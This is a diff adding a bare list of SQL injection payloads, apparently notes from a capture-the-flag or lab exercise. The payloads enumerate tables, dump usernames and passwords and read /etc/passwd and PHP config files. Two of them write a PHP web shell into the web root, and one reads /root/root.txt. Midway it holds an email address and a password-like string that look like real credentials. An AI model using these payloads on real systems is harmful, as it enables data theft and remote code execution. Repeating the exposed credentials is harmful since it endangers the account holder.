@@ -1,0 +1,28 @@
+
+' UNION SELECT 1,column_name,3,4 from information_schema.columns where table_name='users'-- 
+
+' UNION SELECT 1,username,password,4 from users-- 
+
+
+' UNION SELECT 1,super_priv,user,4 from mysql.user-- 
+
+' UNION SELECT 1,grantee,privilege_type,4 from information_schema.user_privileges-- 
+
+
+' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- 
+
+' UNION SELECT 1, TO_BASE64(LOAD_FILE('/var/www/html/search.php')), 3, 4-- 
+
+' UNION SELECT 1, TO_BASE64(LOAD_FILE('/var/www/html/config.php')), 3, 4-- 
+
+shamsiddin.parpiev@adverity.com
+!$N-vHjgc35)c.@
+
+
+' union select 1, variable_name, variable_value,3 from information_schema.global_variables where variable_name='secure_file_priv'-- 
+
+' union select 1, '<?php system($_GET[0]); ?>', 3,4 into outfile '/var/www/html/shell.php'-- 
+
+
+' UNION SELECT 1,'<?php system($_GET[0]); ?>',4,5,6 into outfile '/var/www/html/dashboard/shell.php'-- 
+' UNION SELECT 1, TO_BASE64(LOAD_FILE('/root/root.txt')), 3, 4,5-- 
